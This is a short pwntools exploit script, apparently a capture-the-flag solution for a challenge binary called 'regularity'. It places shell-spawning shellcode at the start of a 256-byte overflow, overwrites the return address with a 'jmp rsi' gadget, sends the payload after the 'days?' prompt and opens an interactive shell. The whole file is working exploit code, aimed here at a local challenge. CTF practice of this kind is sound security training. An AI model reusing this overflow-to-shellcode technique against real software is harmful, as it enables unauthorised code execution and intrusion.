from pwn import *

elf = context.binary = ELF('../challenge/regularity', checksec=False)

if args.REMOTE:
    p = remote('127.0.0.1', 1337)
else:
    p = process()

JMP_RSI = next(elf.search(asm('jmp rsi')))

payload = flat({
    0:      asm(shellcraft.sh()),
    256:    JMP_RSI
})

p.sendlineafter(b'days?\n', payload)
p.interactive()
